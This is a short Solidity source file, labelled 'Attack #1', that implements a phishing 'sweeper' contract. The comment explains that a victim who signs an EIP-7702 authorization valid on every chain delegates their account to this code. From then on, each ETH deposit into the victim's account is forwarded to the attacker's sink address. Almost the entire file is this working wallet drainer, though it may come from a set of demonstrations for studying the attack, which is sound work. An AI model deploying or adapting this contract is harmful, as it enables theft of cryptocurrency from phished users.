// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// Attack #1. A phishing "sweeper". The victim signs an EIP-7702 authorization
/// (chainId 0 = valid on every chain) delegating their EOA to this code. From then
/// on, any ETH that lands in the victim's account runs this receive() in the
/// victim's own context and forwards the whole balance to the attacker's sink.
contract Sweeper {
    address payable public immutable sink;
    constructor(address s) { sink = payable(s); }
    receive() external payable {
        (bool ok, ) = sink.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
